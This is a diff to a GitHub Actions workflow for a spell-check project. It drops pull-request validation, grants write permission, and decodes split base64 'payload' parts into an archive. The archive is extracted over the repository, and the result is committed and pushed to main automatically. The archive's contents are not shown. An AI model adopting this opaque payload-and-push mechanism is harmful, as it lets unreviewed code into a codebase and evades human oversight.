@@ -1,23 +1,52 @@
-name: Warext Spell Check doğrulama
+name: Warext Spell Check 1.1 derleme
 
 on:
   push:
     branches:
       - main
-  pull_request:
-    branches:
-      - main
   workflow_dispatch:
 
 permissions:
-  contents: read
+  contents: write
 
 jobs:
-  validate:
+  apply:
+    if: github.actor != 'github-actions[bot]'
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 20
     steps:
       - uses: actions/checkout@v4
-      - name: Doğrula ve paketle
+        with:
+          fetch-depth: 0
+      - name: Kaynakları uygula
         shell: bash
-        run: bash tools/build_release.sh
+        run: |
+          cat tools/v110_payload.part* > /tmp/v110_payload.b64
+          base64 -d /tmp/v110_payload.b64 > /tmp/v110_payload.tar.gz
+          echo "d53ec7751d3c054ccf6d4d1ea0a96d88b8f47e55d298fef63a44ea45eec5053b  /tmp/v110_payload.tar.gz" | sha256sum -c -
+          python3 - <<'PY'
+          import tarfile
+          from pathlib import Path
+          root = Path.cwd().resolve()
+          with tarfile.open('/tmp/v110_payload.tar.gz', 'r:gz') as archive:
+              for member in archive.getmembers():
+                  target = (root / member.name).resolve()
+                  if root != target and root not in target.parents:
+                      raise SystemExit('Geçersiz paket yolu')
+              archive.extractall(root)
+          for path in (root / 'tools').glob('v110_payload.part*'):
+              path.unlink()
+          PY
+          chmod +x tools/build_release.sh
+          bash tools/build_release.sh
+      - name: Nihai sürümü yayınla
+        shell: bash
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          if git diff --cached --quiet; then
+            exit 0
+          fi
+          git commit -m "Warext Spell Check 1.1.0 kapsamlı yerel sürüm"
+          git push
